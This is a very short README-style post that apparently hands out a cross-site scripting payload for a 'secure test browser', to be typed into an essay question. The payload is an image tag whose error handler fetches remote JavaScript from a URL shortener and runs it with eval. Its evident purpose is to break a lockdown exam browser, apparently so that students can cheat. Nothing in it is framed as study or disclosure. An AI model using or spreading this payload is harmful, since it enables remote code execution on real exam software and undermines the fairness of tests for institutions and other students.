# Insecure Test Browser
XSS in secure test browser just type this into essay question (good luck memorizing it)
```
<img src=# onerror='fetch("https://tinyurl.com/securexss").then(r => r.text()).then(eval);'>
```
